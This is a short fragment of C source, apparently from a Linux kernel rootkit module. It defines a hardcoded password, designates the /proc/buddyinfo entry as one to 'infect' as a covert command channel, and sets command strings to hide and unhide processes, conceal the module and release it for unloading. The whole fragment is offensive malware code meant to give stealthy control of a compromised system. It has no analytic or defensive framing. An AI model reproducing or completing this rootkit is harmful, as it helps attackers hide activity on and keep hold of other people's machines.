static char password[] = "secretpassword";
static char passwaiter[] = "buddyinfo";		/* name of /proc entry to infect
											 * commands will be passed to it */

// module commands
static char module_release[] = "release";	/* release the module
											 * (make it possible to unload it) */
static char module_uncover[] = "uncover";	/* show the module */
static char hide_proc[] = "hide";			/* hide specified process */
static char unhide_proc[] = "unhide";		/* show last hidden process */